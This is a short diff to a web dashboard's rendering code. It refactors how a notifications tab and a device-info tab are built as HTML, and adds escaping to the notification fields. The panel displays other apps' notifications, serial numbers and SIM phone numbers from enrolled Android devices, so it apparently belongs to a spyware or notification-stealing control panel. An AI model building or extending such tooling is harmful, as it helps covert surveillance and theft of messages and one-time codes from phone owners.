-        <div class="msg-date">${n.date || ''}</div>
-      </div>
-    `).join('');
-  }
-  else if (currentTab === 'info') {
-    body.innerHTML = `
-      <div class="message-item">
-        <div class="msg-sender">Device Info</div>
-        <div class="msg-body">
-          <strong>Model:</strong> ${dev.device_model || '-'}<br>
-          <strong>Manufacturer:</strong> ${dev.device_manufacturer || '-'}<br>
-          <strong>Android:</strong> ${dev.android_version || '-'}<br>
-          <strong>Serial:</strong> ${dev.serial_number || '-'}<br>
-          <strong>Battery:</strong> ${dev.battery || '-'}<br>
-          <strong>Status:</strong> ${dev.status || '-'}<br>
-          <strong>SIM 1:</strong> ${dev.sim_info?.sim1_number || '-'}<br>
-          <strong>SIM 2:</strong> ${dev.sim_info?.sim2_number || '-'}<br>
-          <strong>Installed:</strong> ${dev.first_install_time || dev.install_time || '-'}<br>
-          <strong>Last Seen:</strong> ${dev.last_seen ? new Date(dev.last_seen).toLocaleString() : '-'}
-        </div>
-      </div>
-    `;
+    body.innerHTML = list.map(([k, n]) => '<div class="message-item"><div class="msg-sender">' + escapeHtml(n.app || 'App') + ' — ' + escapeHtml(n.title || '') + '</div><div class="msg-body">' + escapeHtml(n.message || '') + '</div><div class="msg-date">' + (n.date || '') + '</div></div>').join('');
+  } else if (currentTab === 'info') {
+    body.innerHTML = '<div class="message-item"><div class="msg-sender">Device Info</div><div class="msg-body"><strong>Model:</strong> ' + (dev.device_model || '-') + '<br><strong>Manufacturer:</strong> ' + (dev.device_manufacturer || '-') + '<br><strong>Android:</strong> ' + (dev.android_version || '-') + '<br><strong>Serial:</strong> ' + (dev.serial_number || '-') + '<br><strong>Battery:</strong> ' + (dev.battery || '-') + '<br><strong>Status:</strong> ' + (dev.status || '-') + '<br><strong>SIM 1:</strong> ' + (dev.sim_info?.sim1_number || '-') + '<br><strong>SIM 2:</strong> ' + (dev.sim_info?.sim2_number || '-') + '<br><strong>Installed:</strong> ' + (dev.first_install_time || dev.install_time || '-') + '<br><strong>Last Seen:</strong> ' + (dev.last_seen ? new Date(dev.last_seen).toLocaleString() : '-') + '</div></div>';
   }
 }
 
